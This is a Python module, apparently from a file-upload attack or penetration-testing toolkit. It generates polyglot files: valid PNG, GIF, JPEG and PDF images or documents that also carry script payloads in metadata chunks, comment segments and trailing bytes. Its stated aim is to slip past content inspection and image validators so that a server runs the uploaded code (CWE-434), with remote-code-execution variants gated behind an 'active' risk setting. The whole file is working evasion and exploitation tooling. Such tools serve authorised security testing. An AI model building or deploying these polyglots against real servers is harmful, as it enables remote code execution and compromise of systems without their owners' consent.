"""Polyglot files: structurally valid as an image/doc *and* carrying a payload,
to defeat content inspection and real image validators."""
from __future__ import annotations

import gzip
import zlib

from ..core import register, Context, Artifact
from .. import payloads
from ._util import maybe_obf


def _png_with_payload(payload: bytes) -> bytes:
    """Minimal valid PNG carrying the payload in a zTXt chunk."""
    header = (b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
              b"\x08\x06\x00\x00\x00\x1f\x15\xc4\x89")
    chunk_data = b"payload\x00\x00" + gzip.compress(payload)
    chunk = (len(chunk_data).to_bytes(4, "big") + b"zTXt" + chunk_data
             + zlib.crc32(b"zTXt" + chunk_data).to_bytes(4, "big"))
    idat = b"\x00\x00\x00\x0cIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4"
    iend = b"\x00\x00\x00\x00IEND\xaeB`\x82"
    # trailing payload after IEND — many parsers accept it, server may execute.
    return header + chunk + idat + iend + payload


def _gif_with_payload(payload: bytes) -> bytes:
    return b"GIF89a" + b"\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff" \
           b"!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00" \
           b"\x02\x02D\x01\x00;" + payload


def _jpeg_with_payload(payload: bytes) -> bytes:
    # SOI + APP0/JFIF + COM segment holding the payload.
    soi = b"\xff\xd8"
    jfif = b"\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    com = b"\xff\xfe" + (len(payload) + 2).to_bytes(2, "big") + payload
    eoi = b"\xff\xd9"
    return soi + jfif + com + eoi + payload


def _pdf_with_payload(payload: bytes) -> bytes:
    return b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n" + payload + b"\n%%EOF"


BUILDERS = {
    "png": _png_with_payload,
    "gif": _gif_with_payload,
    "jpg": _jpeg_with_payload,
    "jpeg": _jpeg_with_payload,
    "pdf": _pdf_with_payload,
}


@register("polyglot", category="polyglot", risk="safe",
          description="Valid image/PDF that also carries a payload.",
          reference="CWE-434")
def polyglot(ctx: Context):
    # PoC polyglot is safe; RCE polyglot only under active profiles.
    variants = [("poc", payloads.POC, "safe")]
    if ctx.profile.risk_ceiling != "safe":
        variants.append(("rce", payloads.RCE, "active"))

    for lang in ctx.langs():
        for ext, builder in BUILDERS.items():
            if ext not in ctx.target.extensions:
                continue
            for kind, table, risk in variants:
                code = table.get(lang)
                if not code:
                    continue
                payload = maybe_obf(ctx, lang, code).encode()
                data = builder(payload)
                yield Artifact(
                    relpath=f"{lang}/polyglots/{kind}.{lang}.{ext}",
                    data=data, technique="polyglot", category="polyglot",
                    risk=risk, language=lang,
                    description=f"{ext.upper()}+{lang} polyglot ({kind}).",
                    usage="Passes image/PDF validation; executed if served by handler.",
                    reference="CWE-434",
                )
